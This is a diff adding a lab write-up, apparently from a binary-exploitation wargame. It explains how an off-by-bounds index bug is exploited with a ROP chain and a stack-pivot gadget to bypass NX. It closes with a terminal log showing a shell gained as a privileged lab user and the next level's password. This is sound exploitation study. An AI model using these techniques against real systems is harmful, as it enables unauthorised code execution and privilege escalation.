@@ -221,3 +221,52 @@ Insert ROP chain here:
 cat ~lab5A/.pass
 th4ts_th3_r0p_i_lik3_2_s33
 ```
+
+### Lab 5A
+* Very similar to lab3A.
+  * Only a few differences:
+    1. Index is now _unsigned_.
+    2. It's compiled statically.
+    3. Stack is NX.
+    4. There is now a check that the index is under 100 (size of buffer).
+      * This is a bug! Check should be that index is under _25_ (number of elements in array).
+  * This means we can write anywhere before, up to 300 bytes past the end, which doesn't reach RA.
+  * That means we will need to write our ROP code somewhere (in the buffer is fine) and then overwrite _store_number_'s RA with a stack pivot gadget.
+* Every third DWORD again cannot be written to (again).
+* Need to make a ROP chain that can handle these gaps: Just choose gadgets that pop extra, perhaps.
+* There is a `add esp, 0x2c; ret` gadget, which jumps 44 extra bytes. RA of `store_number` happens to be _exactly_ 44 bytes in front of the buffer, plus the first element of the buffer cannot be written to (0 % 3 == 0), but that accounts for the four bytes that are removed by the return in the function itself!
+* See _lab5A.py_.
+
+```bash
+lab5A@warzone:/levels/lab05$ (python /tmp/lab5A.py; cat -) | ./lab5A
+----------------------------------------------------
+  Welcome to doom's crappy number storage service!
+          Version 2.0 - With more security!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   doom has reserved some storage for himself :>
+----------------------------------------------------
+
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:  Completed store command successfully
+Input command:  Number:  Index:
+id
+uid=1020(lab5A) gid=1021(lab5A) euid=1021(lab5end) groups=1022(lab5end),1001(gameuser),1021(lab5A)
+cat ~lab5end/.pass
+byp4ss1ng_d3p_1s_c00l_am1rite
+```
